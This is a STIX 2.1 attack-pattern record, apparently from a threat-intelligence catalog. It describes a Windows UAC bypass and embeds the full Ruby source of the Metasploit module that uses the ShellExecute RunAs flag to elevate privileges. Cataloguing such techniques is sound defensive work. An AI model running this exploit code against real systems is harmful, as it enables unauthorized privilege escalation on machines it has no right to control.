{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--af2432d6-f148-487f-bb3e-433a270c5cee",
    "created": "2024-08-14T16:49:35.290612Z",
    "modified": "2024-08-14T16:49:35.290615Z",
    "name": "Windows Escalate UAC Execute RunAs",
    "description": "( This module will attempt to elevate execution level using the ShellExecute undocumented RunAs flag to bypass low UAC settings. ) 'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ask.rb",
            "external_id": "ask.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Windows Escalate UAC Execute RunAs',\n      'Description'   => %q(\n        This module will attempt to elevate execution level using\n        the ShellExecute undocumented RunAs flag to bypass low\n        UAC settings.\n      ),\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n        'mubix', # Original technique\n        'b00stfr3ak' # Added powershell option\n      ],\n      'Platform'      => ['win'],\n      'SessionTypes'  => ['meterpreter'],\n      'Targets'       => [['Windows', {}]],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2012-01-03'\n    ))\n\n    register_options([\n      OptString.new('FILENAME', [false, 'File name on disk']),\n      OptString.new('PATH', [false, 'Location on disk, %TEMP% used if not set']),\n      OptEnum.new('TECHNIQUE', [true, 'Technique to use', 'EXE', %w(PSH EXE)]),\n    ])\n  end\n\n  def exploit\n    if is_uac_enabled?\n      print_status 'UAC is Enabled, checking level...'\n      case get_uac_level\n      when UAC_NO_PROMPT\n        print_good 'UAC is not enabled, no prompt for the user'\n      else\n        print_status \"The user will be prompted, wait for them to click 'Ok'\"\n      end\n    else\n      print_good 'UAC is not enabled, no prompt for the user'\n    end\n\n    case datastore['TECHNIQUE']\n    when 'EXE'\n      shell_execute_exe(datastore['FILENAME'], datastore['PATH'])\n    when 'PSH'\n      shell_execute_psh\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-03",
    "x_mitre_platforms": [
        "['win']"
    ]
}